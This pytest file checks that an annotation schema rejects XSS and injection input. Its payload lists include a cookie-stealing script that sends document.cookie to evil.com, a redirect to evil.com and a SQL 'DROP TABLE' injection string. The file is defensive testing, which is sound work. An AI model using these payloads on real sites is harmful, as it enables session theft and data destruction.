"""
XSS and Input Sanitization Tests (Simplified)

Tests both backend validation to ensure the application is protected against XSS attacks.
"""
import pytest
from pydantic import ValidationError

from schemas import AnnotationRequest, BboxSchema


class TestBackendXSSSanitization:
    """Test backend XSS protection and input validation."""
    
    def test_annotation_label_xss_protection(self):
        """Test that XSS attempts in label field are rejected."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<script>document.location='http://evil.com'</script>",
            "';alert('xss');//",
            "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
            "<object data='data:text/html,<script>alert(1)</script>'></object>"
        ]
        
        for payload in xss_payloads:
            with pytest.raises((ValueError, ValidationError)):
                AnnotationRequest(
                    example_id="test_123",
                    bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                    label=payload,
                    annotator_id="test_user",
                    quality_score=0.9
                )
    
    def test_annotation_label_valid_input(self):
        """Test that valid labels are accepted."""
        valid_labels = [
            "person",
            "car",
            "truck_large",
            "person-walking",
            "traffic light",
            "Class123",
            "object_detection_123"
        ]
        
        for label in valid_labels:
            # Should not raise exception
            request = AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label=label,
                annotator_id="test_user",
                quality_score=0.9
            )
            assert request.label == label
    
    def test_annotation_label_pattern_enforcement(self):
        """Test that label pattern is strictly enforced."""
        invalid_labels = [
            "a" * 51,  # Too long
            "label@symbol",  # Invalid character
            "label#hash",  # Invalid character
            "label$dollar",  # Invalid character
            "label%percent",  # Invalid character
            "label+plus",  # Invalid character
            "label=equals",  # Invalid character
            "label[bracket",  # Invalid character
            "label{brace",  # Invalid character
            "label|pipe",  # Invalid character
            "label\\backslash",  # Invalid character
            "label/slash",  # Invalid character
            "label?question",  # Invalid character
            "label:colon",  # Invalid character
            "label;semicolon",  # Invalid character
            "label\"quote",  # Invalid character
            "label'apostrophe",  # Invalid character
            "label<less",  # Invalid character
            "label>greater",  # Invalid character
        ]
        
        for label in invalid_labels:
            with pytest.raises((ValueError, ValidationError)):
                AnnotationRequest(
                    example_id="test_123",
                    bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                    label=label,
                    annotator_id="test_user",
                    quality_score=0.9
                )
    
    def test_annotator_id_xss_protection(self):
        """Test that XSS attempts in annotator_id field are rejected."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "user<img src=x onerror=alert('xss')>",
            "user'; DROP TABLE annotations; --",
            "admin<svg onload=alert('xss')>",
            "user@domain.com<script>alert('xss')</script>"
        ]
        
        for payload in xss_payloads:
            with pytest.raises((ValueError, ValidationError)):
                AnnotationRequest(
                    example_id="test_123",
                    bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                    label="person",
                    annotator_id=payload,
                    quality_score=0.9
                )
    
    def test_notes_xss_protection(self):
        """Test that XSS attempts in notes field are rejected."""
        # Script tag should be rejected
        with pytest.raises((ValueError, ValidationError)):
            AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label="person",
                annotator_id="test_user",
                notes="This is a note <script>alert('xss')</script> with bad content",
                quality_score=0.9
            )
        
        # Event handlers should be rejected
        with pytest.raises((ValueError, ValidationError)):
            AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label="person",
                annotator_id="test_user",
                notes="Click here <span onclick='alert(1)'>link</span>",
                quality_score=0.9
            )
    
    def test_notes_length_validation(self):
        """Test that notes length is enforced."""
        long_notes = "a" * 1001  # Too long
        
        with pytest.raises((ValueError, ValidationError)):
            AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label="person",
                annotator_id="test_user",
                notes=long_notes,
                quality_score=0.9
            )
    
    def test_valid_annotation_request(self):
        """Test that a completely valid request works."""
        request = AnnotationRequest(
            example_id="test_123",
            bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
            label="person-walking",
            annotator_id="user_123",
            quality_score=0.9,
            notes="Clear detection of person walking"
        )
        
        assert request.label == "person-walking"
        assert request.annotator_id == "user_123"
        assert request.quality_score == 0.9
        assert request.notes == "Clear detection of person walking"


class TestSecurityBestPractices:
    """Test security best practices implementation."""
    
    def test_input_length_limits(self):
        """Test that input length limits are enforced."""
        # Label too long
        with pytest.raises((ValueError, ValidationError)):
            AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label="a" * 51,  # Max is 50
                annotator_id="test_user",
                quality_score=0.9
            )
        
        # Annotator ID too long
        with pytest.raises((ValueError, ValidationError)):
            AnnotationRequest(
                example_id="test_123",
                bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                label="person",
                annotator_id="a" * 101,  # Max is 100
                quality_score=0.9
            )
    
    def test_character_whitelist_enforcement(self):
        """Test that only whitelisted characters are allowed."""
        # Valid characters should work
        request = AnnotationRequest(
            example_id="test_123",
            bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
            label="Valid_Label-123",
            annotator_id="valid_user_123",
            quality_score=0.9
        )
        assert request.label == "Valid_Label-123"
        
        # Invalid characters should be rejected
        invalid_chars = "!@#$%^&*()+=[]{}|\\:;\"'<>,.?/~`"
        
        for char in invalid_chars:
            with pytest.raises((ValueError, ValidationError)):
                AnnotationRequest(
                    example_id="test_123",
                    bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                    label=f"label{char}test",
                    annotator_id="test_user",
                    quality_score=0.9
                )
    
    def test_dangerous_html_patterns_blocked(self):
        """Test that dangerous HTML patterns are blocked."""
        dangerous_patterns = [
            "<iframe src='evil.com'></iframe>",
            "<object data='evil'></object>",
            "<embed src='evil'>",
            "<link rel='stylesheet' href='evil.css'>",
            "<style>body{background:url('evil.com')}</style>",
            "javascript:alert(1)",
            "vbscript:msgbox(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        
        for pattern in dangerous_patterns:
            with pytest.raises((ValueError, ValidationError)):
                AnnotationRequest(
                    example_id="test_123",
                    bbox=BboxSchema(x1=10, y1=10, x2=100, y2=100),
                    label="person",
                    annotator_id="test_user",
                    notes=pattern,
                    quality_score=0.9
                )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
